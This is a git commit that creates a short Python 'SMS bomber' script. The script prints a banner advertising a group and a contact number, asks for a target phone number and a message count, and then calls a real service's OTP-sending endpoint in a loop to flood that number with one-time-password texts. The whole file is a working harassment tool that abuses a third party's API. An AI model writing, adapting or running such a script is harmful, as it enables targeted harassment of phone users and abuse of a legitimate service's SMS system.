cd370b2bf6ac1fe587fd96968fd52602a5e84caa
SECRET-MAFIYA <112773825+SECRET-MAFIYA@users.noreply.github.com>
2022-09-05 10:06:38 +0600

    Create bom.py

---
+++ bom.py
@@ -0,0 +1,47 @@
+import requests ,os 
+
+os.system("clear")
+
+m= """
+
+  ____   ____  __  __ 
+
+ |  _ \ / __ \|  \/  |
+
+ | |_) | |  | | \  / |
+
+ |  _ <| |  | | |\/| |
+
+ | |_) | |__| | |  | |
+
+ |____/ \____/|_|  |_|
+
+                      
+
+════════════════════════════════════════════
+
+FACEBOOK GRUOP : SECRET MAFIYA
+
+WHATSUP : +8801939996203
+
+WARNING  : DONT TRY TO COPPY MY SCRYPT
+
+TOL  : SMS BOMBAR TOLS
+
+════════════════════════════════════════════
+
+"""
+
+print(m)
+
+number=str(input("ENTER TERGET NUMBER : "))
+
+amount=int(input("ENTER SMS AMOUNT : "))
+
+api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+
+for i in range  (amount):
+
+   requests.get(api)
+
+   print(str(i+1)+"SMS SEND 😈")
